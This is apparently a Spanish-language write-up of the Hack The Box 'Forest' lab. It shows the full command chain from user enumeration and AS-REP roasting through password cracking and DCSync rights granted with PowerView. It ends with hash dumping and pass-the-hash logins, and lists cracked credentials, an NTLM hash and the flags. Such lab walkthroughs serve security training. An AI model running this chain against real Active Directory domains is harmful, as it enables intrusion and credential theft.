``sudo nmap 10.10.10.161 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``
![[Pasted image 20250313124032.png]]
![Pasted image 20250313124032](https://github.com/user-attachments/assets/cce45e1d-40db-41e1-8c41-31f49d98e1b7)


``nmap 10.10.10.161 -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703 -oN target``
![[Pasted image 20250313124107.png]]
domain: htb.local

Vamos a ver un poco más del DC:
``netexec smb 10.10.10.161``
![[Pasted image 20250313124206.png]]

La máquina se llama FOREST. Y confirmamos que el dominio es htb.local
-> /etc/hosts
![[Pasted image 20250313124246.png]]

Para enumerar los usuarios del dominio, podemos conectarnos por RPC con null sesion:

``rpcclient -U '' 10.10.10.161 -N``
-> enumdomusers
![[Pasted image 20250313124508.png]]

Para guardarnos este listado de usuarios y después hacer el correspondiente tratamiento de los datos, vamos a redirigir el output a users.txt

``rpcclient -U '' 10.10.10.161 -N -c 'enumdomusers' > users.txt``

Si miramos el contenido de users.txt, es exactamente lo mismo que el output que vimos anteriormente:
![[Pasted image 20250313124641.png]]


Vamos a hacer un tratamiento a los datos para quedarnos sólo con lo que está entre los corchetes:

``cat users.txt | cut -d '[' -f2 | cut -d ']' -f1 > realusers.txt``
![[Pasted image 20250313124825.png]]


Con este listado de usuarios, y aunque no tengamos sus contraeñas, podemos, por ejemplo, intentar ASREPROAST:

``impacket-GetNPUsers -no-pass -usersfile realusers.txt htb.local/ -output hashes.asreproast ``

-> Bingo.
![[Pasted image 20250313125028.png]]

Como hemos redirigido el output a hashes.asreproast, no hace falta que nos copiemos el contenido del hash.

Vamos a utilizar hashcat para romper este hash. Primero, vamos a averiguar el código de identificación de este tipo de hash (``krb5asrep$23$``) para hashcat:

``hashcat --help | grep -i "kerberos"``
![[Pasted image 20250313125209.png]]

Una vez sabemos el código de identificación, tiramos hashcat con rockyou.

``hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force ``
![[Pasted image 20250313125311.png]]

svc-alfresco:s3rvice

Vamos a validar las credenciales:
``netexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'``
![[Pasted image 20250313125410.png]]

Son credenciales válidas. Vamos a comprobar si permite winrm.
![[Pasted image 20250313125504.png]]
Pwn3d!, por lo que podemos conectarnos vía winRM.

``evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'``
![[Pasted image 20250313125644.png]]

Estamos dentro de la máquina víctima con el usuario svc-alfresco.

En C:\Users\svc-alfresco\Desktop encontramos la flag de usuario:
![[Pasted image 20250313125828.png]]

user.txt = bf0f56f595904036ffb277db1f60f15a


# PRIVESC

Vamos a compartir bloodhound para ayudarnos en la escalada de privilegios.
-> arrancamos neo4j
``sudo neo4j start
-> arrancamos bloodhound
``bloodhound --no-sandbox &>/dev/null & disown``
Introducimos las credenciales de bloodhound.

Como en este escenario en concreto la víctima tiene el servicio DNS activado, podemos enumerar vía bloodhound-python:

``bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -c all -ns 10.10.10.161``
![[Pasted image 20250313132042.png]]

Una vez hemos generado todos los archivos .json, los subimos desde bloodhound:
![[Pasted image 20250313132148.png]]

![[Pasted image 20250313132228.png]]

Una vez se ha subido correctamente toda la data, buscamos al usuario que tenemos pwneado: svc-alfresco
![[Pasted image 20250313132326.png]]

Y lo marcamos como owned:
![[Pasted image 20250313132345.png]]

Si miramos la información del nodo de svc-alfresco, apartado Reachable High Value Targets, vemos:
![[Pasted image 20250313145534.png]]

svc-alfresco forma parte de "Service Accounts", que a su vez forma parte de "Privileged It Accounts", que a su vez forma parte de "Account Operators".

Si miramos la información del nodo de "Account Operators" + Reachable High Value Targets:
![[Pasted image 20250313145759.png]]

Vemos que Accounts Operators tiene GenericAll sobre Exchange Windows Permissions, que a su vez tiene WriteDacl sobre el dominio htb.local:

Click derecho -> help
![[Pasted image 20250313145841.png]]

GenericAll sobre Exchange Windows Permissions:
![[Pasted image 20250313145901.png]]

WriteDacl sobre el dominio:
![[Pasted image 20250313153133.png]]

En el apartado "Windows Abuse" nos explica el paso a paso.
Para poder abusar de este privilegio a través de Add-DomainObjectAcl tenemos que compartir la herramienta powerview.ps1, para ello:

- En máquina atacante abrimos smbserver (en el directorio donde tengamos powerview.ps1):
``impacket-smbserver -smb2support test .``

- Solicitamos el recurso desde máquina víctima:
``copy //10.10.14.4/test/powerview.ps1 powerview.ps1``

Una vez ya lo tenemos en la máquina víctima, comenzamos.

Creamos usuario pwn:
![[Pasted image 20250313155139.png]]

Le metemos en el grupo "Exchange Windows Permissions"
![[Pasted image 20250313155200.png]]

Y seguimos los comandos propuestos por Bloodhound, pero adaptados a nuestro escenario (dominio y usuario):

```
$SecPassword = ConvertTo-SecureString 'pwned123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\pwn', $SecPassword)
```

Importamos powerview.ps1 para poder hacer uso de Add-DomainObjectAcl:
``. .\powerview.ps1``

Otorgamos privilegios DCSync al usuario pwn:
``Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity pwn -Rights DCSync``

Inciso.
	Aquí bloodhound propone ejecutar el anterior comando identificando al dominio (htb.local) de la siguiente forma: ``-TargetIdentity htb.local``. Sin embargo, cuando se realiza el ataque de DCSync desde el usuario pwn, nos salta error mencionando el Distinguised name.
	Error:
		![[Pasted image 20250313163246.png]]
	Y aunque se utilice -use-vss como nos propone, nos da acceso denegado:
	![[Pasted image 20250313163310.png]]

Esto se soluciona identificando al dominio como:
``-TargetIdentity "DC=htb,DC=local"``
![[Pasted image 20250313160755.png]]


Una vez el usuario pwn tiene el privilegio DCSync, lo explotamos vía impacket para volcar todos los hashes NTLM:

``impacket-secretsdump htb.local/'pwn':'pwned123!'@'10.10.10.161'``
![[Pasted image 20250313161100.png]]

Nos aparecen todos los hashes NTLM, pero a nosotros nos interesa especialmente el del usuario Administrator.

Validamos el hashNTLM con netexec:
``netexec smb 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'``
![[Pasted image 20250313161236.png]]
Listo.

Dado que conocemos el hash NTLM válido de Administrator, y como nos pone Pwn3d, podemos ingresar vía psexec (para acceder como NTAuthority\System) o wmiexec (para acceder como Adminsitrator), o winRM a través de la técnica Pass The Hash.

- psexec:
``impacket-psexec Administrator@10.10.10.161 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'``
![[Pasted image 20250313161653.png]]

- wmiexec: 
``impacket-wmiexec Administrator@10.10.10.161 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'
![[Pasted image 20250313161707.png]]

- evilwinrm:
Primero deberíamos validar que nos podemos conectar por winrm
``netexec winrm 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
![[Pasted image 20250313161332.png]]

``evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
![[Pasted image 20250313161907.png]]

Podemos conectarnos a la máquina víctima y elevar privilegios de cualquiera de estas tres formas descritas.

Recogemos la flag de Administrator en C:\Users\Administrator\Desktop\root.txt

![[Pasted image 20250313162055.png]]

root.txt = fba540a19e1959ee5e4fea99d18e01ce
